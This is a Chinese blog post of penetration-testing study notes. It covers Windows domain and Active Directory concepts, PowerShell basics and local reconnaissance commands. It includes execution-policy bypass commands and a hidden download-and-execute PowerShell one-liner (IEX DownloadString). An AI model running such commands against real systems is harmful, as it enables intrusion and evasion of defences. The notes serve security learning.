

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="梓曰">
  <meta name="keywords" content="">
  
    <meta name="description" content="第一章 1.1 工作组 **概念：**将不同的计算机按功能（或部门）组成的一个计算机集合 **特点：**工作组没有集中管理的作用，所有计算机都是对等的（即没有客户机与服务机之分） 域 基本概念 一个具有安全边界的计算机集合（安全边界指一个域中的用户无法访问另一个域中的资源） 什么是域控制器 域中一台类似管理服务器的计算机 域控制器的特点 负责所有连入的计算机和用户的验证工作 存在有域内账户、密码等">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透学习笔记">
<meta property="og:url" content="https://equinox-shame.github.io/2024/06/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
<meta property="og:site_name" content="Autumnal">
<meta property="og:description" content="第一章 1.1 工作组 **概念：**将不同的计算机按功能（或部门）组成的一个计算机集合 **特点：**工作组没有集中管理的作用，所有计算机都是对等的（即没有客户机与服务机之分） 域 基本概念 一个具有安全边界的计算机集合（安全边界指一个域中的用户无法访问另一个域中的资源） 什么是域控制器 域中一台类似管理服务器的计算机 域控制器的特点 负责所有连入的计算机和用户的验证工作 存在有域内账户、密码等">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2024/06/10/SAOC8uMk4sTr1hL.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/10/ogFrO3pXHZkEeu8.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/10/xY1rgIGu4oA3pNF.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/10/xi487rs6OjFNptq.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/10/KW6v7siqhYJRmt4.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/10/uPDSGe6A54YzgE9.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/10/xDeqAiIksLmt5cJ.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/11/ILBwpFyMZnDfl5T.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/11/sDeT8OEq1biXhnC.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/11/JGO45it8p9CZXVF.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/11/IF2PAg7L3BVz8yd.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/11/ufe593wS7msBRhl.png">
<meta property="og:image" content="https://s2.loli.net/2024/06/11/iy9zf3PqxLC1Hmp.png">
<meta property="og:image" content="https://seevae.github.io/img/kerberos6.jpg">
<meta property="article:published_time" content="2024-06-11T15:45:26.035Z">
<meta property="article:modified_time" content="2024-06-11T15:45:20.461Z">
<meta property="article:author" content="梓曰">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s2.loli.net/2024/06/10/SAOC8uMk4sTr1hL.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>内网渗透学习笔记 - Autumnal</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"equinox-shame.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"2aM6IUUWOeDGCZaDdRhrvLam-gzGzoHsz","app_key":"GQdXw2PjI9DScgw5QHVCZeYm","server_url":"https://2am6iuuw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Autumnal Equinox</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="内网渗透学习笔记"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-11 23:45" pubdate>
          2024年6月11日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          26k 字
        
      </span>
    

    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">内网渗透学习笔记</h1>
            
            
              <div class="markdown-body">
                
                <h1>第一章</h1>
<h2 id="1-1">1.1</h2>
<h3 id="工作组">工作组</h3>
<p>**概念：**将不同的计算机按功能（或部门）组成的一个计算机集合</p>
<p>**特点：**工作组没有集中管理的作用，所有计算机都是对等的（即没有客户机与服务机之分）</p>
<h3 id="域">域</h3>
<h4 id="基本概念">基本概念</h4>
<p>一个具有安全边界的计算机集合（安全边界指一个域中的用户无法访问另一个域中的资源）</p>
<h4 id="什么是域控制器">什么是域控制器</h4>
<p>域中一台类似管理服务器的计算机</p>
<h3 id="域控制器的特点">域控制器的特点</h3>
<p>负责所有连入的计算机和用户的验证工作</p>
<p>存在有域内账户、密码等属于域内计算机的信息构成的数据库</p>
<p>可以有多个域控</p>
<h3 id="域环境">域环境</h3>
<p>域环境一般有：单域、父域和子域、域树、域森林、域名服务器</p>
<h4 id="父域和子域的关系">父域和子域的关系</h4>
<p>一个父域包含多个子域，父域子域是相对关系，其中父域与子域的安全策略独立</p>
<h3 id="域树">域树</h3>
<p>域树是多个域通过建立信任关系组成的集合</p>
<p><img src="https://s2.loli.net/2024/06/10/SAOC8uMk4sTr1hL.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>使用点好进行隔开，一个“.”代表一个层次，放在域名的最后子域称为最高子域或一级域，他前面的子域称为二级域</p>
<p>子域只能使用父域的名字作为其域名的后缀</p>
<h3 id="域森林">域森林</h3>
<p>域森林指多个域树通过建立信任关系组成的集合</p>
<p><img src="https://s2.loli.net/2024/06/10/ogFrO3pXHZkEeu8.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h3 id="活动目录">活动目录</h3>
<p>活动目录是指域环境中<strong>提供目录服务的组件</strong>，存储有关网络对象的信息，帮助用户快速准确的从目录中找到其所需要信息的服务。提供了网络环境的集中管理机制</p>
<p>功能主要为：拥有账号、软件、环境的集中管理，增强安全性，更可靠更短的宕机时间</p>
<p>ISA防火墙、Exchange邮件服务器、SMS系统服务管理服务器都依赖于活动目录</p>
<h3 id="安全域划分">安全域划分</h3>
<p>DMZ称为隔离区，为了解决安装防火墙后外部网络不能访问内部网络服务器的问题而设立的<strong>一个非安全系统与安全系统之间的缓冲区</strong>。位于企业内部网络和外部网络之间</p>
<p>拥有DMZ的网络时，需要定义以下访问控制：</p>
<ul>
<li>内网可以访问外网</li>
<li>内网可以访问DMZ</li>
<li>外网不能访问内网</li>
<li>外网可以访问DMZ</li>
<li>DMZ不能访问内网、外网</li>
</ul>
<p>内网的划分：办公区、核心区</p>
<p>鱼叉攻击：直接针对特定目标进行攻击，如钓鱼邮件</p>
<p>水坑攻击：没有确定的目的，如在受害者常访问的网站设置恶意代码等待受害者踩坑</p>
<h3 id="域内权限解读">域内权限解读</h3>
<h4 id="组">组</h4>
<p>组是用户账号的集合，方便统计管理和分配权限</p>
<p>需要记忆以下几个组：</p>
<ul>
<li>
<p>域本地组：来自于全林，作用于本域（多域用户访问本域内资源）</p>
</li>
<li>
<p>全局组：来自于本域，作用于全林（本域用户访问多域资源）</p>
</li>
<li>
<p>通用组：来自于全林，作用于全林（保存不经常变化的信息，不推荐直接保存账号信息）</p>
</li>
</ul>
<h4 id="A-G-DL-P策略">A-G-DL-P策略</h4>
<p>指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p>
<ul>
<li>
<p>A：表示用户账号</p>
</li>
<li>
<p>G：表示全局组</p>
</li>
<li>
<p>DL：表示域本地组</p>
</li>
<li>
<p>P：表示资源权限</p>
</li>
<li>
<p>U：表示通用组</p>
</li>
</ul>
<h4 id="重要本地组权限">重要本地组权限</h4>
<ul>
<li>管理员组：成员可以不受限制地存取计算机/域的资源</li>
<li>账号操作员组：成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器</li>
<li>服务器操作员组：成员可以管理域服务器</li>
</ul>
<h4 id="重要全局组权限">重要全局组权限</h4>
<ul>
<li>域管理员组：成员在所有加入域的服务器（工作站）、域控制器和活动目录中均默认拥有完整的管理员权限。</li>
<li>企业系统管理员组：是域森林根域中的一个组。 该组在域森林中的每个域内都是Administrators组的成员，因此对所有域控制器都有完全访问权。</li>
<li>架构管理员组：是域森林根域中的一个组。 可以修改活动目录和域森林的模式。该组是为活动目录和域控制器提供完整权限的域用户组</li>
<li>域用户组：包含所有的域成员，默认情况下建立的用户账号均属于域用户组</li>
</ul>
<h2 id="1-2">1.2</h2>
<h3 id="虚拟机网络适配器">虚拟机网络适配器</h3>
<p>桥接模式：虚拟机视为独立的机器，有DHCP可以自动分配地址，无DHCP只能手动分配地址</p>
<p>NAT模式：虚拟机通过物理机的连接访问网络（即NAT地址转换），除主机外其他网络无法访问虚拟机（默认模式）</p>
<p>Host-only模式：虚拟机处于独立的网段，只能通过连接共享功能实现共享上网，否则无法上网。</p>
<h3 id="PowerShell">PowerShell</h3>
<p>PowerShell是一个<strong>命令行外壳程序</strong>和<strong>脚本环境</strong></p>
<p>特点：</p>
<ul>
<li>Win7以上系统默认安装</li>
<li>脚本可以在内存执行，不写入硬盘</li>
<li>几乎不会触发杀毒软件</li>
<li>可以远程执行</li>
<li>PowerShell运行通常不会被阻止（cmd通常会被阻止）</li>
<li>可管理活动目录</li>
</ul>
<p>扩展名：<code>.ps1</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 获取版本信息</span><br><span class="hljs-built_in">Get-Host</span><br><span class="hljs-variable">$PSVersionTable</span>.PSVersion<br></code></pre></td></tr></table></figure>
<h3 id="执行策略">执行策略</h3>
<h4 id="获取当前执行策略">获取当前执行策略</h4>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ExecutionPolicy</span><br></code></pre></td></tr></table></figure>
<p>一般会有以下几种执行策略：</p>
<ul>
<li>Restricted：脚本不能执行（默认设置）</li>
<li>RemoteSigned：本地脚本可以执行，但是网上下载的脚本不能运行（有数字证书签名除外）</li>
<li>AllSigned：仅由受信任的发布者签名才能运行</li>
<li>Unrestricted：允许所有脚本运行</li>
</ul>
<h4 id="修改执行策略">修改执行策略</h4>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ExecutionPolicy</span> &lt;Policy name&gt;<br></code></pre></td></tr></table></figure>
<h3 id="脚本运行">脚本运行</h3>
<p>需要输入完整的路径以及文件名字，如果在系统目录则可以使用<code>.\a.ps1</code>来运行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Script\a.ps1<br></code></pre></td></tr></table></figure>
<h3 id="命令格式">命令格式</h3>
<p>一般采用<strong>动词-名词</strong>形式，同时其<strong>不区分大小写</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-Item</span> filename <span class="hljs-literal">-ItemType</span> Directory	<span class="hljs-comment"># 新建目录</span><br><span class="hljs-built_in">New-Item</span> filename <span class="hljs-literal">-ItemType</span> File   <span class="hljs-comment"># 新建文件 </span><br><span class="hljs-built_in">Remove-Item</span> filename   <span class="hljs-comment"># 删除文件</span><br><span class="hljs-built_in">Get-Content</span> filename   <span class="hljs-comment"># 显示文本内容</span><br><span class="hljs-built_in">Set-Content</span> filename <span class="hljs-literal">-value</span> <span class="hljs-string">&quot;文件内容&quot;</span>    <span class="hljs-comment"># 设置文本内容</span><br><span class="hljs-built_in">Add-Content</span> filename <span class="hljs-literal">-value</span> <span class="hljs-string">&quot;文件内容&quot;</span>  <span class="hljs-comment"># 文本追加  </span><br><span class="hljs-built_in">Clear-Content</span> filename	<span class="hljs-comment"># 删除内容</span><br></code></pre></td></tr></table></figure>
<h3 id="常用命令-参数">常用命令&amp;参数</h3>
<h4 id="绕过本地权限执行方式">绕过本地权限执行方式</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 方法一</span><br>powershell.exe -ExecutionPolicy Bypass -File Example.ps1<br><span class="hljs-meta">#</span><span class="bash"> 方法二</span><br>powershell.exe -ExecutionPolicy Bypass -Command &quot;&amp;&#123;Import-Module C:\Example.ps1; Invoke-AllChecks&#125;&quot;<br></code></pre></td></tr></table></figure>
<h4 id="常见参数">常见参数</h4>
<p><img src="https://s2.loli.net/2024/06/10/xY1rgIGu4oA3pNF.png" srcset="/img/loading.gif" lazyload alt=""></p>
<h4 id="导入PowerShell命令">导入PowerShell命令</h4>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> C:\Example.ps1<br></code></pre></td></tr></table></figure>
<h4 id="网站下载脚本执行（了解）">网站下载脚本执行（了解）</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -ExecutionPolicy Bypass-WindowStyle Hidden -NoProfile -NonI IEX(New-ObjectNet.webclient).DownloadString(&quot;xxx.ps1&quot;); [Parameters]<br></code></pre></td></tr></table></figure>
<p>采用不加载用户配置文件、非交互模式进行下载</p>
<h1>第二章</h1>
<h2 id="2-2">2.2</h2>
<h3 id="手动收集信息">手动收集信息</h3>
<h4 id="查询网络配置">查询网络配置</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>ipconfig /all<br></code></pre></td></tr></table></figure>
<h4 id="操作系统-软件信息">操作系统&amp;软件信息</h4>
<h4 id="获取操作系统版本">获取操作系统版本</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;<br>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; # 中文版操作系统<br></code></pre></td></tr></table></figure>
<h4 id="查看系统体系结构">查看系统体系结构</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>echo %PROCESSOR_ARCHITECTURE%<br></code></pre></td></tr></table></figure>
<h4 id="查看安装的软件版本、路径">查看安装的软件版本、路径</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wmic</span><br>wmic product get name,version<br><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>powershell &quot;Get-WmiObject -class Win32_Product&quot; | Select-Object -Property name,version<br></code></pre></td></tr></table></figure>
<h4 id="本机服务信息">本机服务信息</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wmic</span><br>wmic service list brief<br></code></pre></td></tr></table></figure>
<h4 id="进程列表">进程列表</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>tasklist<br><span class="hljs-meta">#</span><span class="bash"> wmic</span><br>wmic process list brief<br></code></pre></td></tr></table></figure>
<h4 id="启动进程信息">启动进程信息</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wmic</span><br>wmic startup get command,caption<br></code></pre></td></tr></table></figure>
<h4 id="查看计划任务（要求掌握参数）">查看计划任务（要求掌握参数）</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure>
<blockquote>
<p><strong>/tn</strong> <em>TaskName</em>     指定任务的名称。</p>
<p><strong>/tr</strong> <em>TaskRun</em>      指定任务运行的程序或命令。键入可执行文件、脚本文件或批处理文件的完全合格的路径和文件名。</p>
<p>​				  如果忽略该路径，SchTasks.exe 将假定文件在 <em>Systemroot</em>\System32 目录下。</p>
<p><strong>/sc</strong> <em>schedule</em>     指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</p>
<p>值说明</p>
<p><strong>MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY</strong><br>
指定计划的时间单位。</p>
<p><strong>ONCE</strong><br>
任务在指定的日期和时间运行一次。</p>
<p><strong>ONSTART</strong><br>
任务在每次系统启动的时候运行。可以指定启动的日期，或下一次系统启动的时候运行任务。</p>
<p><strong>ONLOGON</strong><br>
每当用户（任意用户）登录的时候，任务就运行。可以指定日期，或在下次用户登录的时候运行任务。</p>
<p><strong>ONIDLE</strong><br>
只要系统空闲了指定的时间，任务就运行。可以指定日期，或在下次系统空闲的时候运行任务。</p>
<p><strong>/mo</strong> <em>modifier</em>	 指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</p>
<p>计划类型<br>
修饰符<br>
说明</p>
<p>MINUTE<br>
<strong>1</strong> ～ <strong>1439</strong><br>
任务每 <em>n</em> 分钟运行一次。</p>
<p>HOURLY<br>
<strong>1</strong> ～ <strong>23</strong><br>
任务每 <em>n</em> 小时运行一次。</p>
<p>DAILY<br>
<strong>1</strong> ～ <strong>365</strong><br>
任务每 <em>n</em> 天运行一次。</p>
<p>WEEKLY<br>
<strong>1</strong> ～ <strong>52</strong><br>
任务每 <em>n</em> 周运行一次。</p>
<p>MONTHLY<br>
<strong>1</strong> ～ <strong>12</strong><br>
任务每 <em>n</em> 月运行一次。</p>
<p><strong>LASTDAY</strong><br>
任务在月份的最后一天运行。</p>
<p><strong>FIRST</strong>、<strong>SECOND</strong>、<strong>THIRD</strong>、<strong>FOURTH</strong>、<strong>LAST</strong><br>
与 <strong>/d</strong> <em>day</em> 参数共同使用,并在特定的周和天运行任务。例如，在月份的第三个周三。</p>
<p><strong>/d</strong> <em>dirlist</em>	指定周或月的一天。只与 WEEKLY 或 MONTHLY 计划共同使用时有效。</p>
<p>计划类型<br>
日期值</p>
<p>WEEKLY<br>
可选项。有效值是 MON ~ SUN 和 * （每一天）。MON 是默认值。</p>
<p>MONTHLY<br>
在使用 FIRST、SECOND、THIRD、FOURTH 或 LAST 修饰符 (<strong>/mo</strong>) 时，需要 MON ～ SUN 中的某个值。1 ～ 31 是可选的，只在没有修饰符或修饰符为 1 ～ 12 类型时有效。默认值是 1 （月份的第一天）。</p>
<p><strong>/m</strong> <em>month</em>[**,**<em>month</em>…]</p>
<p>指定一年中的一个月。有效值是 JAN ～ DEC 和 * （每个月）。<strong>/m</strong> 参数只对于 MONTHLY 计划有效。在使用 LASTDAY 修饰符时，这个参数是必需的。否则，它是可选的，默认值是 * （每个月）。</p>
<p><strong>/i</strong> <em>InitialPageFileSize</em></p>
<p>指定任务启动之前计算机空闲多少分钟。键入一个 1 ～ 999 之间的整数。这个参数只对于 ONIDLE 计划有效，而且是必需的。</p>
<p><strong>/st</strong> <em>StartTime</em></p>
<p>以 HH:MM:SS 24 小时格式指定时间。默认值是命令完成时的当前本地时间。<strong>/st</strong> 参数只对于 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY 和 ONCE 计划有效。它只对于 ONCE 计划是必需的。</p>
<p><strong>/sd</strong> <em>StartDate</em></p>
<p>以 <em>MM</em>/<em>DD</em>/<em>YYYY</em> 格式指定任务启动的日期。默认值是当前日期。<strong>/sd</strong> 参数对于所有的计划有效，但只对于 ONCE 计划是必需的。</p>
<p><strong>/ed</strong> <em>EndDate</em></p>
<p>指定任务计划运行的最后日期。此参数是可选的。它对于 ONCE、ONSTART、ONLOGON 或 ONIDLE 计划无效。默认情况下，计划没有结束日期。</p>
<p><strong>/s</strong> <em>Computer</em></p>
<p>指定远程计算机的名称或 IP 地址（带有或者没有反斜杠）。默认值是本地计算机。</p>
<p><strong>/u</strong> [<em>domain</em>]<em>user</em></p>
<p>使用特定用户帐户的权限运行命令。默认情况下，使用已登录到运行 SchTasks 的计算机上的用户的权限运行命令。</p>
<p><strong>/p</strong> <em>password</em></p>
<p>指定在 <strong>/u</strong> 参数中指定的用户帐户的密码。如果使用 <strong>/u</strong> 参数，则需要该参数。</p>
<p><strong>/ru</strong> {[<em>Domain</em>]<em>User</em> | <strong>“System”</strong>}</p>
<p>使用指定用户帐户的权限运行任务。默认情况下，使用用户登录到运行 SchTasks 的计算机上的权限运行任务。</p>
<p>值<br>
说明</p>
<p>[<em>domain</em>}<em>User</em>?<br>
指定用户帐户。</p>
<p><strong>“System”</strong> 或 <strong>“”</strong><br>
指定操作系统使用的 NT Authority\System 帐户。</p>
<p><strong>/p</strong> <em>Password</em></p>
<p>指定用户帐户的密码，该用户帐户在 <strong>/u</strong> 参数中指定。如果在指定用户帐户的时候忽略了这个参数，SchTasks.exe 会提示您输入密码而且不显示键入的文本。使用 NT Authority\System 帐户权限运行的任务不需要密码，SchTasks.exe 也不会提示索要密码。</p>
</blockquote>
<h4 id="开机时间">开机时间</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net statistics workstation<br></code></pre></td></tr></table></figure>
<h4 id="用户列表">用户列表</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net user<br></code></pre></td></tr></table></figure>
<h4 id="本地管理员信息（通常包括与用户信息）">本地管理员信息（通常包括与用户信息）</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net localgroup administrators<br></code></pre></td></tr></table></figure>
<h4 id="在线用户">在线用户</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>query user || qwinsta<br></code></pre></td></tr></table></figure>
<h4 id="列出连接会话">列出连接会话</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>net session<br></code></pre></td></tr></table></figure>
<h4 id="端口列表">端口列表</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>netstat -ano<br></code></pre></td></tr></table></figure>
<h4 id="补丁列表">补丁列表</h4>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cmd、PowerShell</span><br>systeminfo<br><span class="hljs-meta">#</span><span class="bash"> wimc</span><br>wimc qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure>
